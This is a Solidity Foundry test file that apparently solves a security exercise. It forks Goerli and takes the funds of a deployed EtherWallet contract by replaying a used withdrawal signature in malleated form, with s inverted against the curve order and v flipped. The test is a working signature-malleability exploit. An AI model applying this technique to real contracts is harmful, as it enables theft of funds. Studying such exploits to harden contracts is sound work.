// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.19;

import "../src/EtherWallet/EtherWallet.sol";
import "forge-std/Test.sol";
import "forge-std/console.sol";

contract EtherWalletTest is Test {
    address alice;
    address contractAddress = 0x4b90946aB87BF6e1CA1F26b2af2897445F48f877;

    function setUp() public {
        string memory RPC = vm.envString("GOERLI_RPC_URL");
        vm.createSelectFork(RPC, 7475420);
        alice = makeAddr("alice");
    }

    function testTakeOwnership() public {
        EtherWallet wallet = EtherWallet(payable(contractAddress));
        vm.startPrank(alice);

        //user inputs of https://goerli.etherscan.io/tx/0x8ccffd2e4bbef4815ee6be1355d1545831257a12aae203bcff711a28bb8d3548

        bytes memory signature =
            hex"53e2bbed453425461021f7fa980d928ed1cb0047ad0b0b99551706e426313f293ba5b06947c91fc3738a7e63159b43148ecc8f8070b37869b95e96261fc9657d1c";
        vm.expectRevert(bytes("Signature already used!"));
        wallet.withdraw(signature);
        //https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/ECDSA.sol
        (uint8 v, bytes32 r, bytes32 s) = deconstructSignature(signature);
        bytes32 groupOrder = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
        bytes32 invertedS = bytes32(uint256(groupOrder) - uint256(s));
        uint8 invertedV = v == 27 ? 28 : 27;

        bytes memory invertedSignature = abi.encodePacked(r, invertedS, invertedV);

        wallet.withdraw(invertedSignature);

        vm.stopPrank();

        assertEq(address(wallet).balance, 0 ether);
    }

    function deconstructSignature(bytes memory signature) public pure returns (uint8, bytes32, bytes32) {
        bytes32 r;
        bytes32 s;
        uint8 v;
        // ecrecover takes the signature parameters, and the only way to get them
        // currently is to use assembly.
        /// @solidity memory-safe-assembly
        assembly {
            r := mload(add(signature, 0x20))
            s := mload(add(signature, 0x40))
            v := byte(0, mload(add(signature, 0x60)))
        }
        return (v, r, s);
    }
}
